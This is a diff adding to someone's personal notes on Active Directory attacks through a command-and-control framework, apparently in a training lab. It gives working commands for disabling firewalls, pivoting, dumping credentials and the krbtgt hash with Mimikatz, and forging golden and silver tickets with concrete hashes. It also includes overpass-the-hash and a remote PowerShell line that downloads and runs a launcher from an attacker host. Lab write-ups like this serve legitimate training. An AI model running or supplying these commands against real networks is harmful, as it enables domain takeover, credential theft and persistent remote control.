@@ -35,3 +35,72 @@
 2. Select bypass AMSI
 3. Run
 ![[Pasted image 20231116171245.png]]+
+
+
+### **Import malware and launch it**
+Use the built-in task of PowerView *PowerShellImport* to import the malware
+
+Once you done this you can go on the interact tab to launch the malware command
+
+![[Pasted image 20231116172507.png]]
+
+### **Download a file**
+Just launch the download command
+```
+Download <File Name>
+```
+
+### **Create a Pivot**
+There is a firewall between our kali and other machine, so we will use pwned machine as pivot
+On pwned machine
+```
+ShellCmd netsh interface portproxy add v4tov4 listenport=80 listenaddress=0.0.0.0 connectport=8080 connectaddress=<OUR IP>
+```
+To check for Local Firewall
+```
+PowerShell Get-NetFirewallProfile
+```
+To disable local firewall
+```
+PowerShell Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+```
+Setup a new listener to link to the studentvm tunnel just created
+![[Pasted image 20231220122530.png]]
+And create a related launcher and launch it on the victim (Connect address and port -> remote pwned machine)
+### **Run Mimikatz**
+![[Pasted image 20231220152858.png]]
+"sekurlsa::logonPasswords"
+
+to dump domain hash from dc
+ "lsadump::lsa /patch" 
+"lsadump::dcsync /user:dcorp\krbtgt"
+
+With Invoke-Mimikatz forge a golden ticket using the krbtgt hash
+
+PowerShell Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+### **Over Pass the Hash**
+Create a new binary launcher on studentListener
+![[Pasted image 20231220153823.png]]
+Host it
+To perform the attack select the task mimikatz and launch the command (You need to have the file on the pwned machine). aes256 not rc4
+```
+"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<aes256> /run:C:\Users\Public\Downloads\BinaryStudent.exe"
+```
+![[Pasted image 20231220155219.png]]
+New grunt inside the launcher pwned machine will appear that has the svcadmin token inside
+```
+ls \\dcorp-dc.dollarcorp.moneycorp.local\C$
+```
+![[Pasted image 20231220155527.png]]
+
+### **Launch a Grunt inside another machine**
+```
+PowerShell Invoke-Command -ScriptBlock {PowerShell -Sta -Nop -Window Hidden -Command "IEX (iwr '<IP AND PATH TO LAUNCHER>' -UseBasicParsing)"} -ComputerName <MACHINE NAME>
+```
+
+### **Persistence**
+Create a silver ticket to HOST service to create a schedule task that open a new grunt
+```
+PowerShell Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:1be12164a06b817e834eb437dc8f581c /user:Administrator /ptt"'
+```
+![[Pasted image 20231221104319.png]]
